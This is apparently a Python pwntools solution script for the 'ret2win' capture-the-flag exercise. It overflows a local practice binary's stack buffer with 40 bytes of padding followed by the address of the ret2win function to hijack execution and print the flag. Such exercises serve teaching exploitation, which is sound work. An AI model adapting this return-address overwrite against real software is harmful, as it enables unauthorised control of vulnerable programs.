from pwn import *

#context.log_level = 'DEBUG'

binary = ELF('./ret2win')
ret2win_addr = binary.symbols['ret2win']

p = process('./ret2win')

p.recvuntil('> ')

p.sendline('A' * 40 + p64(ret2win_addr))

p.recvuntil('flag:')
print "Flag:", p.recv(1024)
